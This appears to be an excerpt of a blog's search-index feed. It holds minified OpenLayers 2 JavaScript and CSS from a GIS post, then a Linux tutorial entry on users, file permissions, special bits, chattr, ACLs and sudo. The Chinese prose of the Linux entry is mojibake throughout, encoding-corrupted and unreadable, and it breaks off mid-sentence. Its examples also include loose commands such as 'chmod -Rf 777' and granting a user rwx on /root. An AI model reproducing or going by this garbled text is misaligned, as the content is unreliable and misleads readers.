b=this.namespaces.georss,c={components:[]},d=this.getElementsByTagNameNS(a,b,"where");if(d&amp;&amp;0&lt;d.length){this.gmlParser||this.initGmlParser();for(var e=0,f=d.length;e&lt; f;e++)this.gmlParser.readChildNodes(d[e],c)}c=c.components;if((d=this.getElementsByTagNameNS(a,b,"point"))&amp;&amp;0&lt;d.length)for(e=0,f=d.length;e&lt;f;e++){var g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s+/);2!=g.length&amp;&amp;(g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s*,\s*/));c.push(new OpenLayers.Geometry.Point(g[1],g[0]))}var h=this.getElementsByTagNameNS(a,b,"line");if(h&amp;&amp;0&lt;h.length)for(var k,e=0,f=h.length;e&lt;f;e++){d=OpenLayers.String.trim(h[e].firstChild.nodeValue).split(/\s+/); k=[];for(var l=0,m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.LineString(k))}if((a=this.getElementsByTagNameNS(a,b,"polygon"))&amp;&amp;0&lt;a.length)for(e=0,f=a.length;e&lt;f;e++){d=OpenLayers.String.trim(a[e].firstChild.nodeValue).split(/\s+/);k=[];l=0;for(m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(k)]))}if(this.internalProjection&amp;&amp;this.externalProjection)for(e= 0,f=c.length;e&lt;f;e++)c[e]&amp;&amp;c[e].transform(this.externalProjection,this.internalProjection);return c},parsePersonConstructs:function(a,b,c){var d=[],e=this.namespaces.atom;a=this.getElementsByTagNameNS(a,e,b);for(var f=["uri","email"],g=0,h=a.length;g&lt;h;g++){var k={};k.name=this.getFirstChildValue(a[g],e,"name",null);for(var l=0,m=f.length;l&lt;m;l++){var n=this.getFirstChildValue(a[g],e,f[l],null);n&amp;&amp;(k[f[l]]=n)}d.push(k)}0&lt;d.length&amp;&amp;(c[b+"s"]=d)},CLASS_NAME:"OpenLayers.Format.Atom"});OpenLayers.Control.KeyboardDefaults=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,slideFactor:75,observeElement:null,draw:function(){this.handler=new OpenLayers.Handler.Keyboard(this,{keydown:this.defaultKeyPress},{observeElement:this.observeElement||document})},defaultKeyPress:function(a){var b,c=!0;b=OpenLayers.Event.element(a);if(!b||"INPUT"!=b.tagName&amp;&amp;"TEXTAREA"!=b.tagName&amp;&amp;"SELECT"!=b.tagName){switch(a.keyCode){case OpenLayers.Event.KEY_LEFT:this.map.pan(-this.slideFactor,0);break;case OpenLayers.Event.KEY_RIGHT:this.map.pan(this.slideFactor, 0);break;case OpenLayers.Event.KEY_UP:this.map.pan(0,-this.slideFactor);break;case OpenLayers.Event.KEY_DOWN:this.map.pan(0,this.slideFactor);break;case 33:b=this.map.getSize();this.map.pan(0,-0.75*b.h);break;case 34:b=this.map.getSize();this.map.pan(0,0.75*b.h);break;case 35:b=this.map.getSize();this.map.pan(0.75*b.w,0);break;case 36:b=this.map.getSize();this.map.pan(-0.75*b.w,0);break;case 43:case 61:case 187:case 107:this.map.zoomIn();break;case 45:case 109:case 189:case 95:this.map.zoomOut(); break;default:c=!1}c&amp;&amp;OpenLayers.Event.stop(a)}},CLASS_NAME:"OpenLayers.Control.KeyboardDefaults"});OpenLayers.Format.WMTSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1_1_0,{version:"1.0.0",namespaces:{ows:"http://www.opengis.net/ows/1.1",wmts:"http://www.opengis.net/wmts/1.0",xlink:"http://www.w3.org/1999/xlink"},yx:null,defaultPrefix:"wmts",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a;a=OpenLayers.Util.extend({},OpenLayers.Format.WMTSCapabilities.prototype.yx);this.yx=OpenLayers.Util.extend(a,this.yx)},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);b.version=this.version;return b},readers:{wmts:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contents={};b.contents.layers=[];b.contents.tileMatrixSets={};this.readChildNodes(a,b.contents)},Layer:function(a,b){var c={styles:[],formats:[],dimensions:[],tileMatrixSetLinks:[],layers:[]};this.readChildNodes(a,c);b.layers.push(c)},Style:function(a, b){var c={};c.isDefault="true"===a.getAttribute("isDefault");this.readChildNodes(a,c);b.styles.push(c)},Format:function(a,b){b.formats.push(this.getChildValue(a))},TileMatrixSetLink:function(a,b){var c={};this.readChildNodes(a,c);b.tileMatrixSetLinks.push(c)},TileMatrixSet:function(a,b){if(b.layers){var c={matrixIds:[]};this.readChildNodes(a,c);b.tileMatrixSets[c.identifier]=c}else b.tileMatrixSet=this.getChildValue(a)},TileMatrix:function(a,b){var c={supportedCRS:b.supportedCRS};this.readChildNodes(a, c);b.matrixIds.push(c)},ScaleDenominator:function(a,b){b.scaleDenominator=parseFloat(this.getChildValue(a))},TopLeftCorner:function(a,b){var c=this.getChildValue(a).split(" "),d;b.supportedCRS&amp;&amp;(d=b.supportedCRS.replace(/urn:ogc:def:crs:(\w+):.+:(\w+)$/,"urn:ogc:def:crs:$1::$2"),d=!!this.yx[d]);b.topLeftCorner=d?new OpenLayers.LonLat(c[1],c[0]):new OpenLayers.LonLat(c[0],c[1])},TileWidth:function(a,b){b.tileWidth=parseInt(this.getChildValue(a))},TileHeight:function(a,b){b.tileHeight=parseInt(this.getChildValue(a))}, MatrixWidth:function(a,b){b.matrixWidth=parseInt(this.getChildValue(a))},MatrixHeight:function(a,b){b.matrixHeight=parseInt(this.getChildValue(a))},ResourceURL:function(a,b){b.resourceUrl=b.resourceUrl||{};var c=a.getAttribute("resourceType");b.resourceUrls||(b.resourceUrls=[]);c=b.resourceUrl[c]={format:a.getAttribute("format"),template:a.getAttribute("template"),resourceType:c};b.resourceUrls.push(c)},WSDL:function(a,b){b.wsdl={};b.wsdl.href=a.getAttribute("xlink:href")},ServiceMetadataURL:function(a, b){b.serviceMetadataUrl={};b.serviceMetadataUrl.href=a.getAttribute("xlink:href")},LegendURL:function(a,b){b.legend={};b.legend.href=a.getAttribute("xlink:href");b.legend.format=a.getAttribute("format")},Dimension:function(a,b){var c={values:[]};this.readChildNodes(a,c);b.dimensions.push(c)},Default:function(a,b){b["default"]=this.getChildValue(a)},Value:function(a,b){b.values.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WMTSCapabilities.v1_0_0"}); style.css div.olMap { z-index: 0; padding: 0 !important; /*margin: 0 !important;*/ cursor: default; } div.olMapViewport { text-align: left; -ms-touch-action: none; } div.olLayerDiv { -moz-user-select: none; -khtml-user-select: none; } .olLayerGoogleCopyright { left: 2px; bottom: 2px; } .olLayerGoogleV3.olLayerGoogleCopyright { right: auto !important; } .olLayerGooglePoweredBy { left: 2px; bottom: 15px; } .olLayerGoogleV3.olLayerGooglePoweredBy { bottom: 15px !important; } /* GMaps should not set styles on its container */ .olForeignContainer { opacity: 1 !important; } .olControlAttribution { font-size: smaller; right: 3px; bottom: 4.5em; position: absolute; display: block; } .olControlScale { right: 3px; bottom: 3em; display: block; position: absolute; font-size: smaller; } .olControlScaleLine { display: block; position: absolute; left: 10px; bottom: 15px; font-size: xx-small; } .olControlScaleLineBottom { border: solid 2px black; border-bottom: none; margin-top:-2px; text-align: center; } .olControlScaleLineTop { border: solid 2px black; border-top: none; text-align: center; } .olControlPermalink { right: 3px; bottom: 1.5em; display: block; position: absolute; font-size: smaller; } div.olControlMousePosition { bottom: 0; right: 3px; display: block; position: absolute; font-family: Arial; font-size: smaller; } .olControlOverviewMapContainer { position: absolute; bottom: 0; right: 0; } .olControlOverviewMapElement { padding: 10px 18px 10px 10px; background-color: #00008B; -moz-border-radius: 1em 0 0 0; } .olControlOverviewMapMinimizeButton, .olControlOverviewMapMaximizeButton { height: 18px; width: 18px; right: 0; bottom: 80px; cursor: pointer; } .olControlOverviewMapExtentRectangle { overflow: hidden; background-image: url("img/blank.gif"); cursor: move; border: 2px dotted red; } .olControlOverviewMapRectReplacement { overflow: hidden; cursor: move; background-image: url("img/overview_replacement.gif"); background-repeat: no-repeat; background-position: center; } .olLayerGeoRSSDescription { float:left; width:100%; overflow:auto; font-size:1.0em; } .olLayerGeoRSSClose { float:right; color:gray; font-size:1.2em; margin-right:6px; font-family:sans-serif; } .olLayerGeoRSSTitle { float:left;font-size:1.2em; } .olPopupContent { padding:5px; overflow: auto; } .olControlNavigationHistory { background-image: url("img/navigation_history.png"); background-repeat: no-repeat; width: 24px; height: 24px; } .olControlNavigationHistoryPreviousItemActive { background-position: 0 0; } .olControlNavigationHistoryPreviousItemInactive { background-position: 0 -24px; } .olControlNavigationHistoryNextItemActive { background-position: -24px 0; } .olControlNavigationHistoryNextItemInactive { background-position: -24px -24px; } div.olControlSaveFeaturesItemActive { background-image: url(img/save_features_on.png); background-repeat: no-repeat; background-position: 0 1px; } div.olControlSaveFeaturesItemInactive { background-image: url(img/save_features_off.png); background-repeat: no-repeat; background-position: 0 1px; } .olHandlerBoxZoomBox { border: 2px solid red; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50); } .olHandlerBoxSelectFeature { border: 2px solid blue; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50); } .olControlPanPanel { top: 10px; left: 5px; } .olControlPanPanel div { background-image: url(img/pan-panel.png); height: 18px; width: 18px; cursor: pointer; position: absolute; } .olControlPanPanel .olControlPanNorthItemInactive { top: 0; left: 9px; background-position: 0 0; } .olControlPanPanel .olControlPanSouthItemInactive { top: 36px; left: 9px; background-position: 18px 0; } .olControlPanPanel .olControlPanWestItemInactive { position: absolute; top: 18px; left: 0; background-position: 0 18px; } .olControlPanPanel .olControlPanEastItemInactive { top: 18px; left: 18px; background-position: 18px 18px; } .olControlZoomPanel { top: 71px; left: 14px; } .olControlZoomPanel div { background-image: url(img/zoom-panel.png); position: absolute; height: 18px; width: 18px; cursor: pointer; } .olControlZoomPanel .olControlZoomInItemInactive { top: 0; left: 0; background-position: 0 0; } .olControlZoomPanel .olControlZoomToMaxExtentItemInactive { top: 18px; left: 0; background-position: 0 -18px; } .olControlZoomPanel .olControlZoomOutItemInactive { top: 36px; left: 0; background-position: 0 18px; } /* * When a potential text is bigger than the image it move the image * with some headers (closes #3154) */ .olControlPanZoomBar div { font-size: 1px; } .olPopupCloseBox { background: url("img/close.gif") no-repeat; cursor: pointer; } .olFramedCloudPopupContent { padding: 5px; overflow: auto; } .olControlNoSelect { -moz-user-select: none; -khtml-user-select: none; } .olImageLoadError { opacity: 0; } /** * Cursor styles */ .olCursorWait { cursor: wait; } .olDragDown { cursor: move; } .olDrawBox { cursor: crosshair; } .olControlDragFeatureOver { cursor: move; } .olControlDragFeatureActive.olControlDragFeatureOver.olDragDown { cursor: -moz-grabbing; } /** * Layer switcher */ .olControlLayerSwitcher { position: absolute; top: 25px; right: 0; width: 20em; font-family: sans-serif; font-weight: bold; margin-top: 3px; margin-left: 3px; margin-bottom: 3px; font-size: smaller; color: white; background-color: transparent; } .olControlLayerSwitcher .layersDiv { padding-top: 5px; padding-left: 10px; padding-bottom: 5px; padding-right: 10px; background-color: darkblue; } .olControlLayerSwitcher .layersDiv .baseLbl, .olControlLayerSwitcher .layersDiv .dataLbl { margin-top: 3px; margin-left: 3px; margin-bottom: 3px; } .olControlLayerSwitcher .layersDiv .baseLayersDiv, .olControlLayerSwitcher .layersDiv .dataLayersDiv { padding-left: 10px; } .olControlLayerSwitcher .maximizeDiv, .olControlLayerSwitcher .minimizeDiv { width: 18px; height: 18px; top: 5px; right: 0; cursor: pointer; } .olBingAttribution { color: #DDD; } .olBingAttribution.road { color: #333; } .olGoogleAttribution.hybrid, .olGoogleAttribution.satellite { color: #EEE; } .olGoogleAttribution { color: #333; } span.olGoogleAttribution a { color: #77C; } span.olGoogleAttribution.hybrid a, span.olGoogleAttribution.satellite a { color: #EEE; } /** * Editing and navigation icons. * (using the editing_tool_bar.png sprint image) */ .olControlNavToolbar , .olControlEditingToolbar { margin: 5px 5px 0 0; } .olControlNavToolbar div, .olControlEditingToolbar div { background-image: url("img/editing_tool_bar.png"); background-repeat: no-repeat; margin: 0 0 5px 5px; width: 24px; height: 22px; cursor: pointer } /* positions */ .olControlEditingToolbar { right: 0; top: 0; } .olControlNavToolbar { top: 295px; left: 9px; } /* layouts */ .olControlEditingToolbar div { float: right; } /* individual controls */ .olControlNavToolbar .olControlNavigationItemInactive, .olControlEditingToolbar .olControlNavigationItemInactive { background-position: -103px -1px; } .olControlNavToolbar .olControlNavigationItemActive , .olControlEditingToolbar .olControlNavigationItemActive { background-position: -103px -24px; } .olControlNavToolbar .olControlZoomBoxItemInactive { background-position: -128px -1px; } .olControlNavToolbar .olControlZoomBoxItemActive { background-position: -128px -24px; } .olControlEditingToolbar .olControlDrawFeaturePointItemInactive { background-position: -77px -1px; } .olControlEditingToolbar .olControlDrawFeaturePointItemActive { background-position: -77px -24px; } .olControlEditingToolbar .olControlDrawFeaturePathItemInactive { background-position: -51px -1px; } .olControlEditingToolbar .olControlDrawFeaturePathItemActive { background-position: -51px -24px; } .olControlEditingToolbar .olControlDrawFeaturePolygonItemInactive{ background-position: -26px -1px; } .olControlEditingToolbar .olControlDrawFeaturePolygonItemActive { background-position: -26px -24px; } div.olControlZoom { position: absolute; top: 8px; left: 8px; background: rgba(255,255,255,0.4); border-radius: 4px; padding: 2px; } div.olControlZoom a { display: block; margin: 1px; padding: 0; color: white; font-size: 18px; font-family: 'Lucida Grande', Verdana, Geneva, Lucida, Arial, Helvetica, sans-serif; font-weight: bold; text-decoration: none; text-align: center; height: 22px; width:22px; line-height: 19px; background: #130085; /* fallback for IE - IE6 requires background shorthand*/ background: rgba(0, 60, 136, 0.5); filter: alpha(opacity=80); } div.olControlZoom a:hover { background: #130085; /* fallback for IE */ background: rgba(0, 60, 136, 0.7); filter: alpha(opacity=100); } @media only screen and (max-width: 600px) { div.olControlZoom a:hover { background: rgba(0, 60, 136, 0.5); } } a.olControlZoomIn { border-radius: 4px 4px 0 0; } a.olControlZoomOut { border-radius: 0 0 4px 4px; } /** * Animations */ .olLayerGrid .olTileImage { -webkit-transition: opacity 0.2s linear; -moz-transition: opacity 0.2s linear; -o-transition: opacity 0.2s linear; transition: opacity 0.2s linear; } /* Turn on GPU support where available */ .olTileImage { -webkit-transform: translateZ(0); -moz-transform: translateZ(0); -o-transform: translateZ(0); -ms-transform: translateZ(0); transform: translateZ(0); -webkit-backface-visibility: hidden; -moz-backface-visibility: hidden; -ms-backface-visibility: hidden; backface-visibility: hidden; -webkit-perspective: 1000; -moz-perspective: 1000; -ms-perspective: 1000; perspective: 1000; } /* when replacing tiles, do not show tile and backbuffer at the same time */ .olTileReplacing { display: none; } /* override any max-width image settings (e.g. bootstrap.css) */ img.olTileImage { max-width: none; } css æ ‡æ³¨çš„å›¾æ ‡æ–‡ä»¶ï¼š http://image.xpshuai.cn/pins.png http://image.xpshuai.cn/pinsback.png demoé¡¹ç›®æ–‡ä»¶ï¼šhttps://github.com/shuai06/openlayer2_Cluster_demo document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS </category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>openlayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxç”¨æˆ·èº«ä»½ä¸æ–‡ä»¶æƒé™]]></title>
    <url>%2Fposts%2F62d07350%2F</url>
    <content type="text"><![CDATA[ç”¨æˆ·èº«ä»½ä¸æ–‡ä»¶æƒé™ ç”¨æˆ· 1.ç®¡ç†å‘˜ root UID: 0 ç³»ç»Ÿç”¨æˆ· 5/6 UID: 1-499 çº¢å¸½7 UID 1-999 /sbin/nologin 3.æ™®é€šç”¨æˆ· 5/6 500-65535 7 1000- id xps # æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ useradd useradd -u 555 xps # æ–°å»ºç”¨æˆ·å¹¶æŒ‡å®šuid useradd -u ssbin/nologin xps # æŒ‡å®šç»ˆç«¯ adduser groupadd hhh # æ–°å»ºç”¨æˆ·ç»„ usermod -G hhh xps # åŸºæœ¬ç»„/æ‰©å±•ç»„ usermod -u 666 xps # ä¿®æ”¹uid groupdel hhh # åˆ é™¤ç”¨æˆ·ç»„ passwd xps # é‡ç½®å¯†ç  userdel xps # åˆ é™¤ç”¨æˆ·(ä¸åˆ é™¤homeç­‰) userdel -r xps # åˆ é™¤ç”¨æˆ·(ä¿¡æ¯å…¨åˆ é™¤ï¼‰ deluser #ä¿®æ”¹nameçš„è¯å¯ä»¥ç›´æ¥å» /etc/passwdä¿®æ”¹ æ–‡ä»¶æƒé™`æ–‡ä»¶ç±»å‹â¢ -ï¼šæ™®é€šæ–‡ä»¶ã€‚â¢ dï¼šç›®å½•æ–‡ä»¶ã€‚â¢ lï¼šé“¾æ¥æ–‡ä»¶ã€‚â¢ bï¼šå—è®¾å¤‡æ–‡ä»¶ã€‚â¢ cï¼šå­—ç¬¦è®¾å¤‡æ–‡ä»¶ã€‚â¢ pï¼šç®¡é“æ–‡ä»¶ã€‚ rè¯»4wå†™2xæ‰§è¡Œ1 ===============chmod # æƒé™ æ ¼å¼ä¸ºâ€œchown [å‚æ•°] æ‰€æœ‰è€…:æ‰€å±ç»„ æ–‡ä»¶æˆ–ç›®å½•åç§°â€ chown root:bin testchown # æ‰€æœ‰è€…ï¼Œå±æ€§ -Rf # å¼ºåˆ¶çš„æ„æ€ chmod -Rf 777 test/chmod -Rf g+s test/ # å¹¶ä¸ºè¯¥ç›®å½•è®¾ç½®äº† SGID ç‰¹æ®Šæƒé™ä½ chmod -R o+t linux/ # è®¾ç½®sbitæƒé™ ä¿æŠ¤ä½ - **æ–‡ä»¶çš„ç‰¹æ®Šæƒé™** 1.SUID # è®©ç¨‹åºæ‰§è¡Œè€…ï¼Œä¸´æ—¶è·å–ç¨‹åºæ‰€æœ‰è€…çš„èº«ä»½ï¼ˆä»…å¯¹æ‹¥æœ‰æ‰§è¡Œæƒé™çš„äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆï¼‰u+s 4 2.SGID # è®©ç¨‹åºæ‰§è¡Œè€…ï¼Œä¸´æ—¶è·å–ç¨‹åºæ‰€æœ‰ç»„çš„èº«ä»½ è®©ç›®å½•å†…çš„æ–°å»ºæ–‡ä»¶ï¼Œé›†æˆç›®å½•æ‰€æœ‰ç»„çš„åç§° g+s 2 3.SBIT #è®©ç›®å½•å†…çš„æ–‡ä»¶ï¼Œåªèƒ½è‡ªå·±åˆ é™¤è‡ªå·±çš„RHEL 7 ç³»ç»Ÿä¸­çš„/tmp ä½œä¸ºä¸€ä¸ªå…±äº«æ–‡ä»¶çš„ç›®å½•ï¼Œé»˜è®¤å·²ç»è®¾ç½®äº† SBIT ç‰¹æ®Šæƒé™ä½ï¼Œå› æ­¤é™¤éæ˜¯è¯¥ç›®å½•çš„æ‰€æœ‰è€…ï¼Œå¦åˆ™æ— æ³•åˆ é™¤è¿™é‡Œé¢çš„æ–‡ä»¶ï¼›å½“ç›®å½•è¢«è®¾ç½® SBIT ç‰¹æ®Šæƒé™ä½åï¼Œæ–‡ä»¶çš„å…¶ä»–äººæƒé™éƒ¨åˆ†çš„ x æ‰§è¡Œæƒé™å°±ä¼šè¢«æ›¿æ¢æˆ t æˆ–è€… Tï¼ŒåŸæœ¬æœ‰ x æ‰§è¡Œæƒé™åˆ™ä¼šå†™æˆ tï¼ŒåŸæœ¬æ²¡æœ‰ x æ‰§è¡Œæƒé™åˆ™ä¼šè¢«å†™æˆ To+t 1 suid:x æ”¹å˜æˆ s å°±æ„å‘³ç€è¯¥æ–‡ä»¶è¢«èµ‹äºˆäº† SUID æƒé™ã€‚å¦‚æœåŸæœ¬çš„æƒé™æ˜¯ rw-å‘¢ï¼Ÿå¦‚æœåŸå…ˆæƒé™ä½ä¸Šæ²¡æœ‰ x æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆè¢«èµ‹äºˆç‰¹æ®Šæƒé™åå°†å˜æˆå¤§å†™çš„ Ss è¯æ˜åŸå…ˆæœ‰xS è¯æ˜åŸå…ˆæ²¡æœ‰x sgid:s è¯æ˜åŸå…ˆæœ‰xS è¯æ˜åŸå…ˆæ²¡æœ‰x sbit:å¯¹å…¶ä»–ç›®å½•æ¥è®¾ç½® SBIT ç‰¹æ®Šæƒé™ä½ï¼Œç”¨ chmod å‘½ä»¤å°±å¯ä»¥äº†ã€‚å¯¹åº”çš„å‚æ•° o+t ä»£è¡¨è®¾ç½® SBIT ç²˜æ»ä½æƒé™ï¼št è¯æ˜åŸå…ˆæœ‰T è¯æ˜åŸå…ˆæ²¡æœ‰x ä¾‹å¦‚ï¼šè½¬æ¢7654 # 7æ˜¯ç‰¹æ®Šæƒé™ä½ï¼Œ 654æ˜¯ä¸€ä¸€èˆ¬æƒé™ä½ 420 401 400 rw- r-x râ€“ 7: = 4+2+1 ä¸‰ä¸ªéƒ½æ¶‰åŠäº†,æ‰€ä»¥è¦éƒ½åŠ ä¸Š # S-&gt;ä¹‹å‰æ²¡æœ‰xæƒé™ï¼Œs-&gt;ä¹‹å‰æœ‰xæƒé™,T-&gt;ä¹‹å‰æ²¡æœ‰â€¦ rwSrwsr-T ======rwsrâ€“rwT rwxrâ€“rw- 746s=4,T=45746 ======r-Srwsâ€“T 5470 - **æ–‡ä»¶çš„éšè—å±æ€§** 1.chattr è®¾ç½®æ–‡ä»¶çš„éšè—æƒé™ï¼Œæ ¼å¼ä¸ºâ€œchattr [å‚æ•°] æ–‡ä»¶â€ chattr +a /var/log/message lsattr æ˜¾ç¤ºæ–‡ä»¶çš„éšè—æƒé™ï¼Œæ ¼å¼ä¸ºâ€œlsattr [å‚æ•°] æ–‡ä»¶â€ lsattr -d Desktop/ $ æŸ¥çœ‹ç›®å½•çš„... `è¡¨ 5-6 chattr å‘½ä»¤ä¸­ç”¨äºéšè—æƒé™çš„å‚æ•°åŠå…¶ä½œç”¨ å‚æ•° å«ä¹‰ i æ— æ³•å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼›è‹¥å¯¹ç›®å½•è®¾ç½®äº†è¯¥å‚æ•°ï¼Œåˆ™ä»…èƒ½ä¿®æ”¹å…¶ä¸­çš„å­æ–‡ä»¶å†…å®¹è€Œä¸èƒ½æ–°å»ºæˆ–åˆ é™¤æ–‡ä»¶ a ä»…å…è®¸è¡¥å……ï¼ˆè¿½åŠ ï¼‰å†…å®¹ï¼Œæ— æ³•è¦†ç›–/åˆ é™¤å†…å®¹ï¼ˆAppend Onlyï¼‰ S æ–‡ä»¶å†…å®¹åœ¨å˜æ›´åç«‹å³åŒæ­¥åˆ°ç¡¬ç›˜ï¼ˆsyncï¼‰ s å½»åº•ä»ç¡¬ç›˜ä¸­åˆ é™¤ï¼Œä¸å¯æ¢å¤ï¼ˆç”¨ 0 å¡«å……åŸæ–‡ä»¶æ‰€åœ¨ç¡¬ç›˜åŒºåŸŸï¼‰ A ä¸å†ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æœ€åè®¿é—®æ—¶é—´ï¼ˆatimeï¼‰ b ä¸å†ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„å­˜å–æ—¶é—´ D æ£€æŸ¥å‹ç¼©æ–‡ä»¶ä¸­çš„é”™è¯¯ d ä½¿ç”¨ dump å‘½ä»¤å¤‡ä»½æ—¶å¿½ç•¥æœ¬æ–‡ä»¶/ç›®å½• c é»˜è®¤å°†æ–‡ä»¶æˆ–ç›®å½•è¿›è¡Œå‹ç¼© u å½“åˆ é™¤è¯¥æ–‡ä»¶åä¾ç„¶ä¿ç•™å…¶åœ¨ç¡¬ç›˜ä¸­çš„æ•°æ®ï¼Œæ–¹ä¾¿æ—¥åæ¢å¤ t è®©æ–‡ä»¶ç³»ç»Ÿæ”¯æŒå°¾éƒ¨åˆå¹¶ï¼ˆtail-mergingï¼‰ X å¯ä»¥ç›´æ¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å†…å®¹ æ–‡ä»¶è®¿é—®æ§åˆ¶åˆ—è¡¨ ACL`å¯¹æŸä¸ªæŒ‡å®šçš„ç”¨æˆ·è¿›è¡Œå•ç‹¬çš„æƒé™æ§åˆ¶å¦‚æœé’ˆå¯¹æŸä¸ªç›®å½•è®¾ç½®äº† ACLï¼Œåˆ™ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šç»§æ‰¿å…¶ ACLï¼›è‹¥é’ˆå¯¹æ–‡ä»¶è®¾ç½®äº† ACLï¼Œåˆ™æ–‡ä»¶ä¸å†ç»§æ‰¿å…¶æ‰€åœ¨ç›®å½•çš„ ACL 1.setfacl å‘½ä»¤(é’ˆå¯¹ç›®å½•æ–‡ä»¶éœ€è¦ä½¿ç”¨-R é€’å½’å‚æ•°ï¼›é’ˆå¯¹æ™®é€šæ–‡ä»¶åˆ™ä½¿ç”¨-m å‚æ•°ï¼›å¦‚æœæƒ³è¦åˆ é™¤æŸä¸ªæ–‡ä»¶çš„ ACLï¼Œåˆ™å¯ä»¥ä½¿ç”¨-b å‚æ•°) setfacl -Rm u:xps:rwx /root # -m ä¿®æ”¹ setfacl -Rm g:xpsg:r-x /tmpçœ‹åˆ°æ–‡ä»¶çš„æƒé™æœ€åä¸€ä¸ªç‚¹ï¼ˆ.ï¼‰å˜æˆäº†åŠ å·ï¼ˆ+ï¼‰ ,è¿™å°±æ„å‘³ç€è¯¥æ–‡ä»¶å·²ç»è®¾ç½®äº† ACL äº†ã€‚ 2.getfacl - su ä¸sudo su - xpssu å‘½ä»¤ä¸ç”¨æˆ·åä¹‹é—´æœ‰ä¸€ä¸ªå‡å·ï¼ˆ-ï¼‰ï¼Œè¿™æ„å‘³ç€å®Œå…¨åˆ‡æ¢åˆ°æ–°çš„ç”¨æˆ·ï¼Œå³æŠŠç¯å¢ƒå˜é‡ä¿¡æ¯ä¹Ÿå˜æ›´ä¸ºæ–°ç”¨æˆ·çš„ç›¸åº”ä¿¡æ¯ï¼Œè€Œä¸æ˜¯ä¿ç•™åŸå§‹çš„ä¿¡æ¯ã€‚å¼ºçƒˆå»ºè®®åœ¨åˆ‡æ¢ç”¨æˆ·èº«ä»½æ—¶æ·»åŠ è¿™ä¸ªå‡å·ï¼ˆ-ï¼‰ ä½¿ç”¨ sudo å‘½ä»¤æŠŠç‰¹å®šå‘½ä»¤çš„æ‰§è¡Œæƒé™èµ‹äºˆç»™æŒ‡å®šç”¨æˆ·(é¿å…æ³„éœ² root ç®¡ç†å‘˜å¯†ç ) sudo æœåŠ¡ä¸­çš„å¯ç”¨å‚æ•°ä»¥åŠä½œç”¨-h åˆ—å‡ºå¸®åŠ©ä¿¡æ¯-l åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½-u ç”¨æˆ·åæˆ– UID å€¼ ä»¥æŒ‡å®šçš„ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½-k æ¸…ç©ºå¯†ç çš„æœ‰æ•ˆæ—¶é—´ï¼Œä¸‹-b åœ¨åå°æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤-p æ›´æ”¹è¯¢é—®å¯†ç çš„æç¤ºè¯­ sudo å‘½ä»¤å…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼šâ¢ é™åˆ¶ç”¨æˆ·æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼šâ¢ è®°å½•ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸€æ¡å‘½ä»¤ï¼›â¢ é…ç½®æ–‡ä»¶ï¼ˆ/etc/sudoersï¼‰æä¾›é›†ä¸­çš„ç”¨æˆ·ç®¡ç†ã€æƒé™ä¸ä¸»æœºç­‰å‚æ•°ï¼›â¢ éªŒè¯å¯†ç çš„å 5 åˆ†é’Ÿå†…ï¼ˆé»˜è®¤å€¼ï¼‰æ— é¡»å†è®©ç”¨æˆ·å†æ¬¡éªŒè¯å¯†ç ã€‚ ä½¿ç”¨ sudo å‘½ä»¤æä¾›çš„ visudo å‘½ä»¤æ¥é…ç½®ç”¨æˆ·æƒé™ã€‚è¿™æ¡å‘½ä»¤åœ¨é…ç½®ç”¨æˆ·æƒé™æ—¶å°†ç¦æ­¢å¤šä¸ªç”¨æˆ·åŒæ—¶ä¿®æ”¹ sudoers é…ç½®æ–‡ä»¶ï¼Œè¿˜å¯ä»¥å¯¹é…ç½®æ–‡ä»¶å†…çš„å‚æ•°è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œå¹¶åœ¨å‘ç°å‚æ•°é”™è¯¯æ—¶è¿›è¡ŒæŠ¥é”™ã€‚(åªæœ‰rootæ‰èƒ½ä½¿ç”¨visudoç¼–è¾‘æ‰€æœåŠ¡çš„é…ç½®æ–‡ä»¶) åœ¨ sudo å‘½ä»¤çš„é…ç½®æ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§ä¸‹é¢çš„æ ¼å¼å°†ç¬¬ 99 